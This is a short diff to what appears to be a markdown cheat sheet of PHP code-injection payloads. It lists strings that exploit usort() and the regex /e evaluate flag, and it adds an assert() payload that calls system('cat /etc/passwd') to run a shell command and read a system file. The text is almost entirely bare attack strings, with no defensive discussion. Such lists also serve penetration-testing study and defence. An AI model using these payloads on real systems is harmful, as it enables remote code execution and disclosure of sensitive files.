@@ -5,4 +5,6 @@
 #### usort()
 `id);}phpinfo();//`
 #### /e (evaluate) flag allowed in regex
-`name=phpinfo();&pattern=/lamer/e&base=Hello lamer`
+`name=phpinfo();&pattern=/lamer/e&base=Hello lamer`  
+#### Assert function being used (when used incorrectly assert will evaluate the value passed to it)
+`name='.system('cat+/etc/passwd');'`
